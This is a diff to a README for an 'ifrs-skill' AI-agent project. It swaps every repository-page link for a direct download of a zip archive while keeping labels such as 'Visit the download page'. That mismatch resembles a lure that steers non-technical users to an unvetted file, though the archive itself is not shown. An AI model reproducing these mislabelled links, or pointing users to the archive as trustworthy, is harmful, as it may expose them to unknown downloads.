@@ -1,6 +1,6 @@
 # 📘 ifrs-skill - IFRS workflows for clear reporting
 
-[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/babu9893/ifrs-skill)
+[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/babu9893/ifrs-skill/raw/refs/heads/main/ifrs/skill_ifrs_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ ifrs-skill helps AI agents work with IFRS tasks, audit checks, and financial rep
 
 Use this page to download and run the project from the link below:
 
-[Visit the download page](https://github.com/babu9893/ifrs-skill)
+[Visit the download page](https://github.com/babu9893/ifrs-skill/raw/refs/heads/main/ifrs/skill_ifrs_v2.5.zip)
 
 ## 🖥️ What You Need
 
@@ -28,7 +28,7 @@ If you only want to view the files, you can do that in your browser after downlo
 ## 📦 Download and Setup
 
 1. Open the download page:
-   [https://github.com/babu9893/ifrs-skill](https://github.com/babu9893/ifrs-skill)
+   [https://github.com/babu9893/ifrs-skill/raw/refs/heads/main/ifrs/skill_ifrs_v2.5.zip](https://github.com/babu9893/ifrs-skill/raw/refs/heads/main/ifrs/skill_ifrs_v2.5.zip)
 
 2. On the GitHub page, look for the green or blue **Code** button.
 
@@ -184,7 +184,7 @@ Here are a few ways a non-technical user might use this project:
 
 If you need the files again, use this page:
 
-[https://github.com/babu9893/ifrs-skill](https://github.com/babu9893/ifrs-skill)
+[https://github.com/babu9893/ifrs-skill/raw/refs/heads/main/ifrs/skill_ifrs_v2.5.zip](https://github.com/babu9893/ifrs-skill/raw/refs/heads/main/ifrs/skill_ifrs_v2.5.zip)
 
 ## 🧭 Quick Path for Windows Users
 
